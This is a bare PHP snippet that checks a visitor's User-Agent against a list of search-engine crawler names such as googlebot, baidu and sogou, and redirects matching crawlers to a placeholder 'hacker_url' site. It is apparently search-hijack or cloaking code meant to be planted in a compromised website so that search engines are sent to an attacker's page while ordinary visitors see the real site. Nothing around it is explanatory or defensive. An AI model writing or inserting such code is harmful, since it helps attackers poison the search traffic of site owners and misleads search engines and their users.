<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
if (isspider($ua)) {
    header("location: http://www.hacker_url.com");
}

function isspider($name) {
    $spider_list = array(
        "googlebot",
        "spider",
        "sogou",
        "yahoo",
        "soso",
        "baidu",
        "360"
    );
    foreach ($spider_list as $spider) {
        if (strpos($name, $spider) == true) {
            return true;
        }
    }
}